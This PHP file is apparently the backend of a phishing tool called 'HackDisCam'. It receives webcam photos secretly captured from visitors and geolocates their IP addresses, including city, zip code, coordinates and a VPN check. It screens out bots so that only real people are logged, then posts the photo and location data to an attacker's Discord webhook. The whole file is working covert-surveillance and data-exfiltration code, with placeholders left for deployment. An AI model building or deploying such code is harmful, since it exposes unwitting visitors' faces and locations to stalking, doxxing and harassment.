<?php

date_default_timezone_set("Asia/Kuala_Lumpur"); // Set your timezone

$webhookurl = "https://discord.com/api/webhooks/"; // Your webhook URL

//Get the visitor's IP
$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
$Browser = $_SERVER['HTTP_USER_AGENT'];

//Stop the bots from logging
if (preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
    exit();
}

//Check if IP is a VPN (Is not always correct!)
$Details = json_decode(file_get_contents("http://ip-api.com/json/{$IP}"));
$VPNConn = json_decode(file_get_contents("https://json.geoiplookup.io/{$IP}"));
if ($VPNConn->connection_type === "Corporate") {
    $VPN = "Yes";
} else {
    $VPN = "No";
}

//Set some variables
$Country = $Details->country;
$CountryCode = $Details->countryCode;
$Region = $Details->regionName;
$City = $Details->city;
$Zip = $Details->zip;
$Lat = $Details->lat;
$Lon = $Details->lon;
$isp = $Details-> isp;

// Upload captured images to folder and rename it
$img = $_POST['cat'];
$folderPath = "images/";
  
$image_parts = explode(";base64,", $img);
$image_type_aux = explode("cat/", $image_parts[0]);
$image_type = $image_type_aux[1];
  
$image_base64 = base64_decode($image_parts[1]);
$fileName ='img_'.date('Y-m-d-H-i-s').'.png';
   
$file = $folderPath . $fileName;
file_put_contents($file, $image_base64);

// Set your image url
$url = "yourwebsite/images/{$fileName}";

$timestamp = date("c", strtotime("now"));

$json_data = json_encode([

    // Username
    "username" => "HackDisCam",

    // Avatar URL.
    // Uncoment to replace image set in webhook
    "avatar_url" => "https://www.seekpng.com/png/detail/246-2465571_webcam-icon-icon.png",

    // Text-to-speech
    "tts" => false,

    // Embeds Array
    "embeds" => [
        [
            // Embed Title
            "title" => "Image captured !",

            // Embed Type
            "type" => "rich",

            // Timestamp of embed must be formatted as ISO8601
            "timestamp" => $timestamp,

            // Embed left border color in HEX
            "color" => hexdec( "3366ff" ),

                "fields" => [array(
                    "name" => "IP",
                    "value" => "$IP",
                    "inline" => true
                ),
                    array(
                        "name" => "VPN?",
                        "value" => "$VPN",
                        "inline" => true
                    ),
                    array(
                        "name" => "Useragent",
                        "value" => "$Browser"
                    ),
                     array(
                        "name" => "ISP",
                        "value" => "$isp"
                    ),
                    array(
                        "name" => "Country/CountryCode",
                        "value" => "$Country/$CountryCode",
                        "inline" => true
                    ),
                    array(
                        "name" => "Region | City | Zip",
                        "value" => "[$Region | $City | $Zip](https://www.google.com/maps/search/?api=1&query=$Lat,$Lon 'Google Maps Location (+/- 750M Radius)')",
                        "inline" => true
                    ),
                     array(
                        "name" => "Latitude , Longtitude",
                        "value" => "$Lat , $Lon",
                        "inline" => true
                    )
                    ],

            // Image to send
            "image" => [
                "url" => "$url"
            ],
            
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
// If you need to debug, or find out why you can't send message uncomment line below, and execute script.
// echo $response;
curl_close( $ch );
?>